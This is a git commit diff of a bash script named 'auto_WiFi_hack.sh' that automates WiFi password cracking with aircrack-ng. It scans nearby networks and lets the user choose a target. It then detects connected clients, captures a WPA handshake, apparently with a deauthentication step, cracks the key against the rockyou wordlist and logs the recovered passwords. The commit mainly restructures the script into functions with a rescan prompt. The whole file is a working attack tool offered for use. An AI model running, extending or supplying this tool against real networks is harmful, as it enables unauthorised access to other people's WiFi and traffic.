0ee0ffe2e3b0d6658eba7fc07671ee212d056964
idoCo10 <122587038+idoCo10@users.noreply.github.com>
2024-04-03 02:16:33 +0700

    Update auto_WiFi_hack.sh

--- auto_WiFi_hack.sh
+++ auto_WiFi_hack.sh
@@ -1,18 +1,19 @@
 #!/bin/bash
 sudo apt update
-sudo apt install aircrack-ng -y
-sudo airmon-ng check kill
+sudo apt install aircrack-ng -y 
 
+sudo airmon-ng check kill
 
 # Check if wlan0 is available
 if iw dev wlan0 info &> /dev/null; then
+    # Check if wlan0 is already in monitor mode
     if iwconfig wlan0 | grep -q "Mode:Monitor"; then
         :
     else
+        # Start wlan0 in monitor mode
         sudo airmon-ng start wlan0
     fi
 fi
-
 
 
 UN=$SUDO_USER
@@ -23,97 +24,139 @@ mkdir -p "$path"
 mkdir -p "$path/Scan"
 sudo chown -R $UN:$UN $path
 
+clear
 
 
-# Scan 10 seconds for wifi networks
-sudo gnome-terminal --geometry=93x35-10000-10000 -- timeout 10s sudo airodump-ng wlan0mon --output-format csv -w $path/Scan/Scan-$current_date
+function network_scanner() {
+	clear
+        # Scan 10 seconds for wifi networks
+        sudo gnome-terminal --geometry=93x35-10000-10000 -- timeout 10s sudo airodump-ng wlan0mon --ignore-negative-one --output-format csv -w $path/Scan/Scan-$current_date
 
-countdown_duration=10
-echo -e "\e[1;34mScanning for available WiFi Networks ($countdown_duration s):\e[0m"
+        countdown_duration=10
+        echo -e "\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
 
-for (( i=$countdown_duration; i>=0; i-- )); do
-    tput cuu1 && tput el
-    echo -e "\e[1;34mScanning for available WiFi Networks ($i s):\e[0m"
-    sleep 1
+        for (( i=$countdown_duration; i>=1; i-- )); do
+            tput cuu1 && tput el
+            echo -e "\e[1;34mScanning for available WiFi Networks:\033[1;31m\033[1m $i \033[0m"
+            sleep 1
+        done
+
+        mv $path/Scan/Scan-$current_date-01.csv $scan_input
+        cp "$scan_input" "$scan_input.original"
+
+        # Edit original scan file to more organized one:
+        awk -F, 'BEGIN {OFS=","} {print $1, $4, $6, $14}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
+        awk '/^Station MAC,/ {print; exit} {print}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
+        awk '$4 != ""' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
+        tail -n +3 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
+        head -n -2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
+
+        clear
+        echo -e "\033[1;33mAvalible WiFi Networks:\033[0m\n"
+
+        # Display the scan input file contents with row numbers
+        printf "    Name: %-35s Encryption: %-6s Channel: %-5s BSSID: %-1s\n" 
+        echo
+        nl -w2 -s', ' "$scan_input" | awk -F', ' '{printf "%-1s. %-42s %-16s %-16s %-5s\n", $1, $5, $4, $3, $2}'
+        echo
+
+        # Prompt the user to choose a row number
+        read -p "Enter row number: " row_number
+        echo
+
+        function is_valid_number() {
+            re='^[0-9]+$'
+            if ! [[ $1 =~ $re ]]; then
+                echo -e "\033[1;31m\033[1m\nError:\033[0m Not a valid number."
+                return 1
+            fi
+
+            num_rows=$(wc -l < "$scan_input")
+            if (( $1 < 1 || $1 > num_rows )); then
+                echo -e "\033[1;31m\033[1m\nError:\033[0m Row number out of range."
+                return 1
+            fi
+
+            return 0
+        }
+
+        # Keep asking for row number until a valid one is entered
+        while ! is_valid_number "$row_number"; do
+            echo
+            read -p "Enter row number: " row_number
+            echo
+        done
+
+        # Extracting values from airodump-ng scan file
+        chosen_row=$(awk -v row="$row_number" 'NR == row' "$scan_input")
+        bssid_address=$(echo "$chosen_row" | awk -F', ' '{print $1}')
+        channel=$(echo "$chosen_row" | awk -F', ' '{print $2}')
+        encryption=$(echo "$chosen_row" | awk -F', ' '{print $3}')
+        bssid_name=$(echo "$chosen_row" | awk -F', ' '{print $4}')
+
+        # Remove "/" from bssid name
+        if [[ $bssid_name == *"/"* ]]; then
+            bssid_name=${bssid_name//\//}
+        fi
+
+        # Echo values
+        echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name"
+        echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address"
+        if [ "$encryption" = "OPN" ]; then
+            echo -e "\033[1;31m\033[1mEncryption:\033[0m none"
+        else
+            echo -e "\033[1;31m\033[1mEncryption:\033[0m $encryption"
+        fi
+        echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
+        echo
+        echo
+
+        if [ "$encryption" = "WPA3" ]; then
+            echo -e "\033[1mThe encryption is WPA3. Can't crack it yet.\033[0m"
+            another_scan_prompt
+        elif [ "$encryption" = "OPN" ]; then
+            echo -e "\033[1mThe Network is open.\033[0m"
+            another_scan_prompt
+        fi
+
+        # if directory exist from previous scan then delete it & create new
+        if [ -d $path/"$bssid_name" ]; then
+            rm -r $path/"$bssid_name"
+        fi
+        mkdir $path/"$bssid_name"
+
+        echo -e "\nScanning if the network still available"
+        gnome-terminal --geometry=93x15-10000-10000 -- script -c "sudo airodump-ng -c $channel -w '$path/$bssid_name/$bssid_name' -d $bssid_address wlan0mon" "$path/$bssid_name/airodump_output.txt" &
+        sleep 10
+}
+
+
+function another_scan_prompt() {
+	while true; do
+	    read -p "Do you want to run another scan? (Y/N): " answer
+	    case $answer in
+		[Yy]* ) network_scanner;;
+		[Nn]* ) echo -e "\nBye." && exit 1;;
+		* ) echo "Please answer yes or no.";;
+	    esac
+	done
+}
+
+# Use scan function
+network_scanner
+
+
+# Check if the Network is available
+while [ "$(grep -c "$bssid_address" "$path/$bssid_name/airodump_output.txt")" -lt 2 ]; do
+    sudo pkill airodump-ng
+    echo -e "\033[1mNetwork appears to be offline now.\033[0m"
+    another_scan_prompt
 done
 
 
-mv $path/Scan/Scan-$current_date-01.csv $scan_input
-cp "$scan_input" "$scan_input.original"
 
 
-# Edit original scan file to more orgenized one:
-awk -F, 'BEGIN {OFS=","} {print $1, $4, $6, $14}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
-awk '/^Station MAC,/ {print; exit} {print}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
-awk '$4 == "" {$4 = "*Hidden*"} 1' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"   
-tail -n +3 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
-head -n -2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"   
-
-
-clear
-echo -e "\033[1;33mAvalible WiFi Networks:\033[0m\n"
-
-
-# Display the scan input file contents with row numbers
-printf "    Name: %-22s Encryption: %-4s BSSID: %-5s\n" 
-echo
-nl -w2 -s', ' "$scan_input" | awk -F', ' '{printf "%-1s. %-28s %-16s %-5s\n", $1, $5, $4, $2}'
-echo
-
-# Prompt the user to choose a row number
-read -p "Enter row number: " row_number
-echo
-chosen_row=$(awk -v row="$row_number" 'NR == row' "$scan_input")
-bssid_address=$(echo "$chosen_row" | awk -F', ' '{print $1}')
-channel=$(echo "$chosen_row" | awk -F', ' '{print $2}')
-encryption=$(echo "$chosen_row" | awk -F', ' '{print $3}')
-bssid_name=$(echo "$chosen_row" | awk -F', ' '{print $4}')
-
-
-
-# Echo values
-echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name"
-echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address"
-if [ "$encryption" = "OPN" ]; then
-    echo -e "\033[1;31m\033[1mEncryption:\033[0m none"
-else
-    echo -e "\033[1;31m\033[1mEncryption:\033[0m $encryption"
-fi
-echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
-echo
-echo
-
-if [ "$encryption" = "WPA3" ]; then
-    echo -e "\033[1mThe encryption is WPA3. Can't crack it yet.\033[0m"
-    exit 1
-elif [ "$encryption" = "OPN" ]; then
-    echo -e "\033[1mThe Network is open.\033[0m" 
-    exit 1
-fi
-
-
-
-# if directory exist from previous scan then delete it & create new
-if [ -d $path/"$bssid_name" ]; then
-    rm -r $path/"$bssid_name"
-fi
-mkdir $path/"$bssid_name"
-
-
-
-# Scan 10 seconds if network on:
-gnome-terminal --geometry=93x15-10000-10000 -- script -c "sudo airodump-ng -c $channel -w '$path/$bssid_name/$bssid_name' -d $bssid_address wlan0mon" "$path/$bssid_name/airodump_output.txt" &
-sleep 10
-
-# Check if the network exists
-if [ "$(grep -c "$bssid_address" "$path/$bssid_name/airodump_output.txt")" -lt 2 ]; then
-    sudo pkill airodump-ng
-    echo -e "\033[1mThe Network appear to be offline now.\033[0m"
-    rm -r $path/"$bssid_name"
-    exit 1
-fi
-
-# Scan for devices for 1 minute
+# Scanning for devices for 1 minute
 for ((i=1; i<=10; i++)); do
     target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")
 
@@ -131,10 +174,11 @@ if [ -z "$target_devices" ]; then
     echo -e "\033[1m\nNo device were found.\033[0m"
     sudo pkill airodump-ng
     rm -r $path/"$bssid_name"
-    exit 1
+    another_scan_prompt
 fi
-
 sleep 3
+
+
 
 # Check if we capture the handshake - Before the attack:
 if sudo grep -q "WPA handshake: $bssid_address" "$path/$bssid_name/airodump_output.txt"; then
@@ -175,11 +219,11 @@ else
         done
     # after 6 unseccessfull attempts, quit the script:
     if [ "$i" == 10 ]; then
-    	echo -e "\033[1m\nNo handshake obtained within 2 minutes.\033[0m"
+    	echo -e "\033[1m\nNo handshake obtained within 2 minutes. Try again.\033[0m"
     	sudo pkill aireplay-ng
         sudo pkill airodump-ng
         rm -r $path/"$bssid_name"
-	exit 1
+        another_scan_prompt
     fi    
   
     done       
@@ -201,12 +245,11 @@ if [ -f "$path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
     echo "The wifi password is:   $wifi_pass" >> $path/wifi_passwords.txt
 else
     echo -e "\nCouldn't finf a match from rockyou wordlist.."
+    another_scan_prompt
 fi
 
 
 
 
-
-# Disable monitor mode
 gnome-terminal --geometry=1x1-10000-10000 -- sudo airmon-ng stop wlan0mon
 gnome-terminal --geometry=1x1-10000-10000 -- sudo systemctl start NetworkManager
